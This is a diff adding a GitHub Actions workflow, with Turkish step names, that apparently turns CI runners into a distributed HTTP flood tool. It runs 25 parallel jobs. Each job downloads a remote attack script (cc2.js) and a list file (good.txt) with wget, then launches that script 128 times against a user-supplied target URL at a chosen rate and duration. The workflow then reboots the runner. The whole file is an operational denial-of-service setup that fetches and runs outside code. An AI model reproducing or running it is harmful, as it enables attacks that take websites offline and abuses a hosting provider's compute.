@@ -1,0 +1,57 @@
+name: erabasetor
+on:
+  workflow_dispatch:
+    inputs:
+      target:
+        description: "URL"
+        required: true
+        default: "https://example.com/"
+      time:
+        description: "Time"
+        required: true
+        default: "120"
+      rate:
+        description: "Rate"
+        required: true
+        default: "64"
+      conc:
+        description: "Concurrency (optional)"
+        required: false
+        default: "1"
+
+jobs:
+  vds:
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 25
+      matrix:
+        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25]
+    
+    steps:
+    - name: Dosyaları indir ve hazırla
+      run: |
+        wget https://curl.by/-atpT/cc2.js -O cc2.js
+        wget https://curl.by/q57MK/good.txt -O good.txt
+        chmod +x cc2.js
+        npm i hpack https commander colors 
+    - name: run
+      run: |
+        TARGET="${{ inputs.target }}"
+        TIME="${{ inputs.time }}"
+        RATE="${{ inputs.rate }}"
+        
+        PIDS=()
+        for i in {1..128}; do
+          sudo timeout $TIME node cc2.js GET "$TARGET" 95 16 "$RATE" good.txt --full  --query 3
+          PIDS+=($!)
+        done
+        
+        for pid in "${PIDS[@]}"; do
+          wait $pid
+        done
+    
+    - name: Bekleme
+      run: sleep ${{ inputs.time }}
+    
+    - name: Sistemi yeniden başlat
+      run: sudo reboot
